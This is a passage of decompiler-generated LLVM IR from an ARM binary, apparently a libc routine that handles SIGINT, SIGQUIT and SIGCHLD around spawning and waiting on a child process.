  store i32 %v2_1a000, i32* %r3.global-to-local, align 4
  %v3_1a004 = icmp uge i32 %v2_1a000, %v1_1a004.pre
  store i1 %v3_1a004, i1* %cpsr_c.global-to-local, align 1
  %v9_1a004 = icmp eq i32 %v2_1a000, %v1_1a004.pre
  br i1 %v9_1a004, label %dec_label_pc_1a00c, label %dec_label_pc_1a024

dec_label_pc_1a020:                               ; preds = %dec_label_pc_1a00c
  %v0_1a020 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1a020, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1a024

dec_label_pc_1a024:                               ; preds = %entry, %dec_label_pc_1a00c.dec_label_pc_1a000_crit_edge, %dec_label_pc_1a020
  %v0_1a024 = phi i32 [ %v0_1a020, %dec_label_pc_1a020 ], [ %v2_1a000161, %entry ], [ %v2_1a000, %dec_label_pc_1a00c.dec_label_pc_1a000_crit_edge ]
  %v1_1a024 = phi i32 [ %v0_1a020, %dec_label_pc_1a020 ], [ 0, %entry ], [ %v1_1a004.pre, %dec_label_pc_1a00c.dec_label_pc_1a000_crit_edge ]
  %v3_1a024 = icmp uge i32 %v0_1a024, %v1_1a024
  store i1 %v3_1a024, i1* %cpsr_c.global-to-local, align 1
  %v9_1a024 = icmp eq i32 %v0_1a024, %v1_1a024
  br i1 %v9_1a024, label %bb89, label %bb

bb:                                               ; preds = %dec_label_pc_1a024
  br label %bb89

bb89:                                             ; preds = %dec_label_pc_1a024, %bb
  store i32 106544, i32* @lr, align 4
  %v1_1a02c = xor i1 %v9_1a024, true
  call void @__pseudo_cond_branch(i1 %v1_1a02c, i32 ptrtoint (i32* @global_var_1907c.1373 to i32))
  store i32 27740, i32* @r4, align 4
  %v0_1a034 = load i32, i32* @r6, align 4
  %v2_1a034 = add i32 %v0_1a034, 27740
  %v3_1a034 = inttoptr i32 %v2_1a034 to i32*
  %v4_1a034 = load i32, i32* %v3_1a034, align 4
  %v1_1a038 = add i32 %v4_1a034, 1
  store i32 %v1_1a038, i32* %r3.global-to-local, align 4
  %v2_1a03c = icmp ne i32 %v1_1a038, 0
  store i1 %v2_1a03c, i1* %cpsr_c.global-to-local, align 1
  %v7_1a03c = icmp eq i32 %v4_1a034, 0
  store i32 %v1_1a038, i32* %v3_1a034, align 4
  br i1 %v7_1a03c, label %dec_label_pc_1a048, label %dec_label_pc_1a0ac

dec_label_pc_1a048:                               ; preds = %bb89
  %v0_1a050 = load i32, i32* @r6, align 4
  %v2_1a050 = add i32 %v0_1a050, 27700
  store i32 %v2_1a050, i32* %r2.global-to-local, align 4
  store i32 %v2_19fc8, i32* %r1.global-to-local, align 4
  %v3_1a058 = call i32 @__libc_sigaction(i32 2, i32 %v2_19fc8, i32 %v2_1a050)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1a05c = icmp slt i32 %v3_1a058, 0
  br i1 %v1_1a05c, label %.thread64, label %dec_label_pc_1a070

.thread64:                                        ; preds = %dec_label_pc_1a048
  %v3_1a060 = load i32, i32* @r6, align 4
  %v4_1a060 = load i32, i32* @r4, align 4
  %v5_1a060 = add i32 %v4_1a060, %v3_1a060
  %v6_1a060 = inttoptr i32 %v5_1a060 to i32*
  %v7_1a060 = load i32, i32* %v6_1a060, align 4
  %v4_1a064 = add i32 %v7_1a060, -1
  store i32 %v4_1a064, i32* %r3.global-to-local, align 4
  store i32 %v4_1a064, i32* %v6_1a060, align 4
  br label %dec_label_pc_1a1cc

dec_label_pc_1a070:                               ; preds = %dec_label_pc_1a048
  store i32 %v2_19fc8, i32* %r1.global-to-local, align 4
  %v0_1a078 = load i32, i32* @r6, align 4
  %v2_1a078 = add i32 %v0_1a078, 27720
  store i32 %v2_1a078, i32* %r2.global-to-local, align 4
  %v3_1a080 = call i32 @__libc_sigaction(i32 3, i32 %v2_19fc8, i32 %v2_1a078)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1a084 = icmp slt i32 %v3_1a080, 0
  br i1 %v1_1a084, label %dec_label_pc_1a08c, label %dec_label_pc_1a0ac

dec_label_pc_1a08c:                               ; preds = %dec_label_pc_1a070
  store i32 98284, i32* %r2.global-to-local, align 4
  %v0_1a090 = load i32, i32* @r6, align 4
  %v1_1a090 = load i32, i32* @r4, align 4
  %v2_1a090 = add i32 %v1_1a090, %v0_1a090
  %v3_1a090 = inttoptr i32 %v2_1a090 to i32*
  %v4_1a090 = load i32, i32* %v3_1a090, align 4
  store i32 %v4_1a090, i32* %r3.global-to-local, align 4
  %v3_1a094 = load i16, i16* @global_var_32088.1320, align 2
  %v4_1a094 = sext i16 %v3_1a094 to i32
  store i32 %v4_1a094, i32* %r2.global-to-local, align 4
  %v0_1a098 = call i32 @__aeabi_read_tp()
  %v1_1a09c = load i32, i32* %r2.global-to-local, align 4
  %v2_1a09c = add i32 %v1_1a09c, %v0_1a098
  %v3_1a09c = inttoptr i32 %v2_1a09c to i32*
  %v4_1a09c = load i32, i32* %v3_1a09c, align 4
  store i32 %v4_1a09c, i32* @r5, align 4
  %v0_1a0a0 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a0a0 = add i32 %v0_1a0a0, -1
  store i32 %v1_1a0a0, i32* %r3.global-to-local, align 4
  %v1_1a0a4 = load i32, i32* @r6, align 4
  %v2_1a0a4 = load i32, i32* @r4, align 4
  %v3_1a0a4 = add i32 %v2_1a0a4, %v1_1a0a4
  %v4_1a0a4 = inttoptr i32 %v3_1a0a4 to i32*
  store i32 %v1_1a0a0, i32* %v4_1a0a4, align 4
  br label %dec_label_pc_1a1a8

dec_label_pc_1a0ac:                               ; preds = %dec_label_pc_1a070, %bb89
  store i32 27744, i32* @r7, align 4
  %v0_1a0b0 = load i32, i32* @r6, align 4
  %v2_1a0b0 = add i32 %v0_1a0b0, 27744
  store i32 %v2_1a0b0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1a0b4

dec_label_pc_1a0b4:                               ; preds = %dec_label_pc_1a0e4.dec_label_pc_1a0b4_crit_edge, %dec_label_pc_1a0ac
  %v0_1a0bc = phi i32 [ %v0_1a0bc.pre, %dec_label_pc_1a0e4.dec_label_pc_1a0b4_crit_edge ], [ %v2_1a0b0, %dec_label_pc_1a0ac ]
  %v1_1a0b4 = phi i32 [ %v1_1a0b4.pre, %dec_label_pc_1a0e4.dec_label_pc_1a0b4_crit_edge ], [ 27744, %dec_label_pc_1a0ac ]
  %v0_1a0b4 = phi i32 [ %v0_1a0b4.pre, %dec_label_pc_1a0e4.dec_label_pc_1a0b4_crit_edge ], [ %v0_1a0b0, %dec_label_pc_1a0ac ]
  %v2_1a0b4 = add i32 %v0_1a0b4, %v1_1a0b4
  %v3_1a0b4 = inttoptr i32 %v2_1a0b4 to i32*
  %v4_1a0b4 = load i32, i32* %v3_1a0b4, align 4
  store i32 %v4_1a0b4, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_1a0bc, i32* %r2.global-to-local, align 4
  %v1_1a0c0148 = inttoptr i32 %v0_1a0bc to i32*
  %v2_1a0c0149 = load i32, i32* %v1_1a0c0148, align 4
  store i32 %v2_1a0c0149, i32* %r3.global-to-local, align 4
  %v3_1a0c4151 = icmp uge i32 %v2_1a0c0149, %v4_1a0b4
  store i1 %v3_1a0c4151, i1* %cpsr_c.global-to-local, align 1
  %v9_1a0c4157 = icmp eq i32 %v2_1a0c0149, %v4_1a0b4
  br i1 %v9_1a0c4157, label %dec_label_pc_1a0cc, label %dec_label_pc_1a0e4

dec_label_pc_1a0cc:                               ; preds = %dec_label_pc_1a0b4, %dec_label_pc_1a0cc.dec_label_pc_1a0c0_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1a0dc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1a0dc, label %dec_label_pc_1a0e0, label %dec_label_pc_1a0cc.dec_label_pc_1a0c0_crit_edge

dec_label_pc_1a0cc.dec_label_pc_1a0c0_crit_edge:  ; preds = %dec_label_pc_1a0cc
  %v0_1a0c0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1a0c4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1a0c0 = inttoptr i32 %v0_1a0c0.pre to i32*
  %v2_1a0c0 = load i32, i32* %v1_1a0c0, align 4
  store i32 %v2_1a0c0, i32* %r3.global-to-local, align 4
  %v3_1a0c4 = icmp uge i32 %v2_1a0c0, %v1_1a0c4.pre
  store i1 %v3_1a0c4, i1* %cpsr_c.global-to-local, align 1
  %v9_1a0c4 = icmp eq i32 %v2_1a0c0, %v1_1a0c4.pre
  br i1 %v9_1a0c4, label %dec_label_pc_1a0cc, label %dec_label_pc_1a0e4

dec_label_pc_1a0e0:                               ; preds = %dec_label_pc_1a0cc
  %v0_1a0e0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1a0e0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1a0e4

dec_label_pc_1a0e4:                               ; preds = %dec_label_pc_1a0b4, %dec_label_pc_1a0cc.dec_label_pc_1a0c0_crit_edge, %dec_label_pc_1a0e0
  %v0_1a0ec = phi i32 [ %v0_1a0e0, %dec_label_pc_1a0e0 ], [ %v2_1a0c0149, %dec_label_pc_1a0b4 ], [ %v2_1a0c0, %dec_label_pc_1a0cc.dec_label_pc_1a0c0_crit_edge ]
  %v1_1a0e4 = phi i32 [ %v0_1a0e0, %dec_label_pc_1a0e0 ], [ %v4_1a0b4, %dec_label_pc_1a0b4 ], [ %v1_1a0c4.pre, %dec_label_pc_1a0cc.dec_label_pc_1a0c0_crit_edge ]
  %v3_1a0e4 = icmp uge i32 %v0_1a0ec, %v1_1a0e4
  store i1 %v3_1a0e4, i1* %cpsr_c.global-to-local, align 1
  %v9_1a0e4 = icmp eq i32 %v0_1a0ec, %v1_1a0e4
  br i1 %v9_1a0e4, label %dec_label_pc_1a0ec, label %dec_label_pc_1a0e4.dec_label_pc_1a0b4_crit_edge

dec_label_pc_1a0e4.dec_label_pc_1a0b4_crit_edge:  ; preds = %dec_label_pc_1a0e4
  %v0_1a0b4.pre = load i32, i32* @r6, align 4
  %v1_1a0b4.pre = load i32, i32* @r7, align 4
  %v0_1a0bc.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1a0b4

dec_label_pc_1a0ec:                               ; preds = %dec_label_pc_1a0e4
  %v2_1a0ec = icmp ne i32 %v1_1a0e4, 0
  store i1 %v2_1a0ec, i1* %cpsr_c.global-to-local, align 1
  %v7_1a0f0 = icmp slt i32 %v1_1a0e4, 2
  br i1 %v7_1a0f0, label %dec_label_pc_1a10c, label %dec_label_pc_1a0f4

dec_label_pc_1a0f4:                               ; preds = %dec_label_pc_1a0ec
  %v0_1a0f8 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a0f8 = add i32 %v0_1a0f8, 129
  store i32 %v1_1a0f8, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* @r7, align 4
  br label %dec_label_pc_1a10c

dec_label_pc_1a10c:                               ; preds = %dec_label_pc_1a0f4, %dec_label_pc_1a0ec
  %v3_1a10c = load i32, i32* %stack_var_-88, align 4
  %v1_1a114 = or i32 %v3_1a10c, 65536
  store i32 %v1_1a114, i32* %r3.global-to-local, align 4
  %v2_1a118 = ptrtoint i32* %stack_var_-88 to i32
  store i32 %v2_1a118, i32* %r1.global-to-local, align 4
  %v2_1a11c = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_1a11c, i32* %r2.global-to-local, align 4
  store i32 %v1_1a114, i32* %stack_var_-88, align 4
  %v4_1a124 = call i32 @__GI_sigprocmask(i32 0, i32* nonnull %stack_var_-88, i32 %v2_1a11c)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1a128 = icmp slt i32 %v4_1a124, 0
  br i1 %v1_1a128, label %dec_label_pc_1a130, label %dec_label_pc_1a234

dec_label_pc_1a130:                               ; preds = %dec_label_pc_1a10c
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_1a134 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_1a134, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_1a13c121 = inttoptr i32 %v0_1a134 to i32*
  %v2_1a13c122 = load i32, i32* %v1_1a13c121, align 4
  store i32 %v2_1a13c122, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1a140124 = icmp eq i32 %v2_1a13c122, 0
  br i1 %v9_1a140124, label %dec_label_pc_1a148, label %dec_label_pc_1a160

dec_label_pc_1a148:                               ; preds = %dec_label_pc_1a130, %dec_label_pc_1a148.dec_label_pc_1a13c_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1a158 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1a158, label %dec_label_pc_1a15c, label %dec_label_pc_1a148.dec_label_pc_1a13c_crit_edge

dec_label_pc_1a148.dec_label_pc_1a13c_crit_edge:  ; preds = %dec_label_pc_1a148
  %v0_1a13c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1a140.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1a13c = inttoptr i32 %v0_1a13c.pre to i32*
  %v2_1a13c = load i32, i32* %v1_1a13c, align 4
  store i32 %v2_1a13c, i32* %r3.global-to-local, align 4
  %v3_1a140 = icmp uge i32 %v2_1a13c, %v1_1a140.pre
  store i1 %v3_1a140, i1* %cpsr_c.global-to-local, align 1
  %v9_1a140 = icmp eq i32 %v2_1a13c, %v1_1a140.pre
  br i1 %v9_1a140, label %dec_label_pc_1a148, label %dec_label_pc_1a160

dec_label_pc_1a15c:                               ; preds = %dec_label_pc_1a148
  %v0_1a15c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1a15c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1a160

dec_label_pc_1a160:                               ; preds = %dec_label_pc_1a130, %dec_label_pc_1a148.dec_label_pc_1a13c_crit_edge, %dec_label_pc_1a15c
  %v0_1a160 = phi i32 [ %v0_1a15c, %dec_label_pc_1a15c ], [ %v2_1a13c122, %dec_label_pc_1a130 ], [ %v2_1a13c, %dec_label_pc_1a148.dec_label_pc_1a13c_crit_edge ]
  %v1_1a160 = phi i32 [ %v0_1a15c, %dec_label_pc_1a15c ], [ 0, %dec_label_pc_1a130 ], [ %v1_1a140.pre, %dec_label_pc_1a148.dec_label_pc_1a13c_crit_edge ]
  %v3_1a160 = icmp uge i32 %v0_1a160, %v1_1a160
  store i1 %v3_1a160, i1* %cpsr_c.global-to-local, align 1
  %v9_1a160 = icmp eq i32 %v0_1a160, %v1_1a160
  br i1 %v9_1a160, label %bb91, label %bb90

bb90:                                             ; preds = %dec_label_pc_1a160
  br label %bb91

bb91:                                             ; preds = %dec_label_pc_1a160, %bb90
  store i32 106860, i32* @lr, align 4
  %v1_1a168 = xor i1 %v9_1a160, true
  call void @__pseudo_cond_branch(i1 %v1_1a168, i32 ptrtoint (i32* @global_var_1907c.1373 to i32))
  store i32 27740, i32* %r2.global-to-local, align 4
  %v0_1a170 = load i32, i32* @r6, align 4
  %v2_1a170 = add i32 %v0_1a170, 27740
  %v3_1a170 = inttoptr i32 %v2_1a170 to i32*
  %v4_1a170 = load i32, i32* %v3_1a170, align 4
  store i32 %v4_1a170, i32* %r3.global-to-local, align 4
  %v1_1a174 = add i32 %v4_1a170, -1
  store i32 %v1_1a174, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1a178 = icmp eq i32 %v1_1a174, 0
  store i32 %v1_1a174, i32* %v3_1a170, align 4
  br i1 %v2_1a178, label %dec_label_pc_1a184, label %dec_label_pc_1a1cc

dec_label_pc_1a184:                               ; preds = %bb91
  store i32 98032, i32* %r3.global-to-local, align 4
  store i32 27720, i32* %r1.global-to-local, align 4
  %v0_1a18c = call i32 @__aeabi_read_tp()
  %v3_1a190 = load i16, i16* @global_var_32088.1320, align 2
  %v4_1a190 = sext i16 %v3_1a190 to i32
  store i32 %v4_1a190, i32* %r3.global-to-local, align 4
  %v2_1a194 = add i32 %v4_1a190, %v0_1a18c
  %v3_1a194 = inttoptr i32 %v2_1a194 to i32*
  %v4_1a194 = load i32, i32* %v3_1a194, align 4
  store i32 %v4_1a194, i32* @r5, align 4
  %v0_1a198 = load i32, i32* @r6, align 4
  %v1_1a198 = load i32, i32* %r1.global-to-local, align 4
  %v2_1a198 = add i32 %v1_1a198, %v0_1a198
  store i32 %v2_1a198, i32* %r1.global-to-local, align 4
  %v0_1a19c = load i32, i32* @r4, align 4
  store i32 %v0_1a19c, i32* %r2.global-to-local, align 4
  %v3_1a1a4 = call i32 @__libc_sigaction(i32 3, i32 %v2_1a198, i32 %v0_1a19c)
  br label %dec_label_pc_1a1a8

dec_label_pc_1a1a8:                               ; preds = %dec_label_pc_1a08c, %dec_label_pc_1a184
  %v0_1a1b0 = load i32, i32* @r6, align 4
  %v2_1a1b0 = add i32 %v0_1a1b0, 27700
  store i32 %v2_1a1b0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_1a1b8 = call i32 @__libc_sigaction(i32 2, i32 %v2_1a1b0, i32 0)
  store i32 97980, i32* %r3.global-to-local, align 4
  %v0_1a1c0 = call i32 @__aeabi_read_tp()
  %v3_1a1c4 = load i16, i16* @global_var_32088.1320, align 2
  %v4_1a1c4 = sext i16 %v3_1a1c4 to i32
  store i32 %v4_1a1c4, i32* %r3.global-to-local, align 4
  %v0_1a1c8 = load i32, i32* @r5, align 4
  %v3_1a1c8 = add i32 %v4_1a1c4, %v0_1a1c0
  %v4_1a1c8 = inttoptr i32 %v3_1a1c8 to i32*
  store i32 %v0_1a1c8, i32* %v4_1a1c8, align 4
  br label %dec_label_pc_1a1cc

dec_label_pc_1a1cc:                               ; preds = %.thread64, %bb91, %dec_label_pc_1a1a8
  store i32 27744, i32* %r5.global-to-local, align 4
  %v0_1a1d0 = load i32, i32* @r6, align 4
  %v2_1a1d0 = add i32 %v0_1a1d0, 27744
  store i32 %v2_1a1d0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1a1d4

dec_label_pc_1a1d4:                               ; preds = %dec_label_pc_1a204.dec_label_pc_1a1d4_crit_edge, %dec_label_pc_1a1cc
  %v0_1a1dc = phi i32 [ %v0_1a1dc.pre, %dec_label_pc_1a204.dec_label_pc_1a1d4_crit_edge ], [ %v2_1a1d0, %dec_label_pc_1a1cc ]
  %v1_1a1d4 = phi i32 [ %v1_1a1d4.pre, %dec_label_pc_1a204.dec_label_pc_1a1d4_crit_edge ], [ 27744, %dec_label_pc_1a1cc ]
  %v0_1a1d4 = phi i32 [ %v0_1a1d4.pre, %dec_label_pc_1a204.dec_label_pc_1a1d4_crit_edge ], [ %v0_1a1d0, %dec_label_pc_1a1cc ]
  %v2_1a1d4 = add i32 %v0_1a1d4, %v1_1a1d4
  %v3_1a1d4 = inttoptr i32 %v2_1a1d4 to i32*
  %v4_1a1d4 = load i32, i32* %v3_1a1d4, align 4
  store i32 %v4_1a1d4, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_1a1dc, i32* %r2.global-to-local, align 4
  %v1_1a1e0109 = inttoptr i32 %v0_1a1dc to i32*
  %v2_1a1e0110 = load i32, i32* %v1_1a1e0109, align 4
  store i32 %v2_1a1e0110, i32* %r3.global-to-local, align 4
  %v3_1a1e4112 = icmp uge i32 %v2_1a1e0110, %v4_1a1d4
  store i1 %v3_1a1e4112, i1* %cpsr_c.global-to-local, align 1
  %v9_1a1e4118 = icmp eq i32 %v2_1a1e0110, %v4_1a1d4
  br i1 %v9_1a1e4118, label %dec_label_pc_1a1ec, label %dec_label_pc_1a204

dec_label_pc_1a1ec:                               ; preds = %dec_label_pc_1a1d4, %dec_label_pc_1a1ec.dec_label_pc_1a1e0_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1a1fc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1a1fc, label %dec_label_pc_1a200, label %dec_label_pc_1a1ec.dec_label_pc_1a1e0_crit_edge

dec_label_pc_1a1ec.dec_label_pc_1a1e0_crit_edge:  ; preds = %dec_label_pc_1a1ec
  %v0_1a1e0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1a1e4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1a1e0 = inttoptr i32 %v0_1a1e0.pre to i32*
  %v2_1a1e0 = load i32, i32* %v1_1a1e0, align 4
  store i32 %v2_1a1e0, i32* %r3.global-to-local, align 4
  %v3_1a1e4 = icmp uge i32 %v2_1a1e0, %v1_1a1e4.pre
  store i1 %v3_1a1e4, i1* %cpsr_c.global-to-local, align 1
  %v9_1a1e4 = icmp eq i32 %v2_1a1e0, %v1_1a1e4.pre
  br i1 %v9_1a1e4, label %dec_label_pc_1a1ec, label %dec_label_pc_1a204

dec_label_pc_1a200:                               ; preds = %dec_label_pc_1a1ec
  %v0_1a200 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1a200, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1a204

dec_label_pc_1a204:                               ; preds = %dec_label_pc_1a1d4, %dec_label_pc_1a1ec.dec_label_pc_1a1e0_crit_edge, %dec_label_pc_1a200
  %v0_1a20c = phi i32 [ %v0_1a200, %dec_label_pc_1a200 ], [ %v2_1a1e0110, %dec_label_pc_1a1d4 ], [ %v2_1a1e0, %dec_label_pc_1a1ec.dec_label_pc_1a1e0_crit_edge ]
  %v1_1a204 = phi i32 [ %v0_1a200, %dec_label_pc_1a200 ], [ %v4_1a1d4, %dec_label_pc_1a1d4 ], [ %v1_1a1e4.pre, %dec_label_pc_1a1ec.dec_label_pc_1a1e0_crit_edge ]
  %v3_1a204 = icmp uge i32 %v0_1a20c, %v1_1a204
  store i1 %v3_1a204, i1* %cpsr_c.global-to-local, align 1
  %v9_1a204 = icmp eq i32 %v0_1a20c, %v1_1a204
  br i1 %v9_1a204, label %dec_label_pc_1a20c, label %dec_label_pc_1a204.dec_label_pc_1a1d4_crit_edge

dec_label_pc_1a204.dec_label_pc_1a1d4_crit_edge:  ; preds = %dec_label_pc_1a204
  %v0_1a1d4.pre = load i32, i32* @r6, align 4
  %v1_1a1d4.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_1a1dc.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1a1d4

dec_label_pc_1a20c:                               ; preds = %dec_label_pc_1a204
  %v2_1a20c = icmp ne i32 %v1_1a204, 0
  store i1 %v2_1a20c, i1* %cpsr_c.global-to-local, align 1
  %v7_1a210 = icmp slt i32 %v1_1a204, 2
  br i1 %v7_1a210, label %dec_label_pc_1a4bc, label %dec_label_pc_1a214

dec_label_pc_1a214:                               ; preds = %dec_label_pc_1a20c
  store i32 129, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1a4bc

dec_label_pc_1a234:                               ; preds = %dec_label_pc_1a10c
  store i32 124, i32* %r3.global-to-local, align 4
  %v0_1a238 = load i32, i32* @r6, align 4
  %v2_1a238 = add i32 %v0_1a238, 124
  %v3_1a238 = inttoptr i32 %v2_1a238 to i32*
  %v4_1a238 = load i32, i32* %v3_1a238, align 4
  store i32 -98744, i32* %r3.global-to-local, align 4
  store i32 %v4_1a238, i32* @r8, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1a240 = icmp eq i32 %v4_1a238, 0
  br i1 %v2_1a240, label %.thread, label %bb92

.thread:                                          ; preds = %dec_label_pc_1a234
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1a24c65 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1a24c65, i32* %r2.global-to-local, align 4
  %v3_1a250 = add i32 %v0_1a238, -98744
  store i32 %v3_1a250, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1a340

bb92:                                             ; preds = %dec_label_pc_1a234
  store i32 1, i32* @r8, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1a24c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1a24c, i32* %r2.global-to-local, align 4
  %v3_1a25c7 = add i32 %v0_1a238, -98744
  store i32 %v3_1a25c7, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1a340

dec_label_pc_1a340:                               ; preds = %bb92, %.thread
  %v0_1a24866 = phi i1 [ false, %.thread ], [ true, %bb92 ]
  call void @__pseudo_cond_branch(i1 %v0_1a24866, i32 %v4_1a238)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 120, i32* @r7, align 4
  store i32 1048593, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i32 1048593, i32* %stack_var_-40, align 4
  store i32 97560, i32* @r5, align 4
  %v2_1a344 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_1a344, i32* @r4, align 4
  br label %dec_label_pc_1a348

dec_label_pc_1a348:                               ; preds = %dec_label_pc_1a364.dec_label_pc_1a348_crit_edge, %dec_label_pc_1a340
  %v3_1a34c = phi i32 [ %v3_1a34c.pre, %dec_label_pc_1a364.dec_label_pc_1a348_crit_edge ], [ 1048593, %dec_label_pc_1a340 ]
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %v2_1a344, i32* %r1.global-to-local, align 4
  %v3_1a354 = call i32 @__libc_waitpid(i32 %v3_1a34c, i32 %v2_1a344, i32 0)
  %v3_1a358 = icmp eq i32 %v3_1a354, -1
  store i1 %v3_1a358, i1* %cpsr_c.global-to-local, align 1
  store i32 %v3_1a354, i32* %r2.global-to-local, align 4
  br i1 %v3_1a358, label %dec_label_pc_1a364, label %dec_label_pc_1a378

dec_label_pc_1a364:                               ; preds = %dec_label_pc_1a348
  %v0_1a364 = call i32 @__aeabi_read_tp()
  %v3_1a368 = load i16, i16* @global_var_32088.1320, align 2
  %v4_1a368 = sext i16 %v3_1a368 to i32
  store i32 %v4_1a368, i32* %r3.global-to-local, align 4
  %v2_1a36c = add i32 %v4_1a368, %v0_1a364
  %v3_1a36c = inttoptr i32 %v2_1a36c to i32*
  %v4_1a36c = load i32, i32* %v3_1a36c, align 4
  store i32 %v4_1a36c, i32* %r3.global-to-local, align 4
  %v2_1a370 = icmp ugt i32 %v4_1a36c, 3
  store i1 %v2_1a370, i1* %cpsr_c.global-to-local, align 1
  %v7_1a370 = icmp eq i32 %v4_1a36c, 4
  br i1 %v7_1a370, label %dec_label_pc_1a364.dec_label_pc_1a348_crit_edge, label %dec_label_pc_1a364.dec_label_pc_1a378_crit_edge

dec_label_pc_1a364.dec_label_pc_1a378_crit_edge:  ; preds = %dec_label_pc_1a364
  %v0_1a37c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1a378

dec_label_pc_1a364.dec_label_pc_1a348_crit_edge:  ; preds = %dec_label_pc_1a364
  %v3_1a34c.pre = load i32, i32* %stack_var_-40, align 4
  br label %dec_label_pc_1a348

dec_label_pc_1a378:                               ; preds = %dec_label_pc_1a348, %dec_label_pc_1a364.dec_label_pc_1a378_crit_edge
  %v0_1a37c = phi i32 [ %v0_1a37c.pre, %dec_label_pc_1a364.dec_label_pc_1a378_crit_edge ], [ %v3_1a354, %dec_label_pc_1a348 ]
  %v3_1a378 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_1a378, i32* %r3.global-to-local, align 4
  %v3_1a37c = icmp uge i32 %v0_1a37c, %v3_1a378
  store i1 %v3_1a37c, i1* %cpsr_c.global-to-local, align 1
  %v9_1a37c = icmp eq i32 %v0_1a37c, %v3_1a378
  br i1 %v9_1a37c, label %dec_label_pc_1a38c, label %dec_label_pc_1a384

dec_label_pc_1a384:                               ; preds = %dec_label_pc_1a378
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %stack_var_-36, align 4
  br label %dec_label_pc_1a38c

dec_label_pc_1a38c:                               ; preds = %dec_label_pc_1a378, %dec_label_pc_1a384
  %v0_1a38c = load i32, i32* @r8, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1a38c = icmp eq i32 %v0_1a38c, 0
  br i1 %v2_1a38c, label %dec_label_pc_1a38c..thread16_crit_edge, label %bb93

dec_label_pc_1a38c..thread16_crit_edge:           ; preds = %dec_label_pc_1a38c
  br label %.thread16

bb93:                                             ; preds = %dec_label_pc_1a38c
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 52, i32* %r3.global-to-local, align 4
  %v1_1a39c = load i32, i32* @r6, align 4
  %v3_1a39c = add i32 %v1_1a39c, 52
  %v4_1a39c = inttoptr i32 %v3_1a39c to i32*
  br label %.thread16

.thread16:                                        ; preds = %dec_label_pc_1a38c..thread16_crit_edge, %bb93
  %v0_1a3a4.in = phi i32* [ @ip, %dec_label_pc_1a38c..thread16_crit_edge ], [ %v4_1a39c, %bb93 ]
  %v0_1a3a4 = load i32, i32* %v0_1a3a4.in, align 4
  %v2_1a3a4 = xor i1 %v2_1a38c, true
  call void @__pseudo_cond_branch(i1 %v2_1a3a4, i32 %v0_1a3a4)
  store i32 27744, i32* %r3.global-to-local, align 4
  %v0_1a3ac = load i32, i32* @r6, align 4
  %v2_1a3ac = add i32 %v0_1a3ac, 27744
  store i32 %v2_1a3ac, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
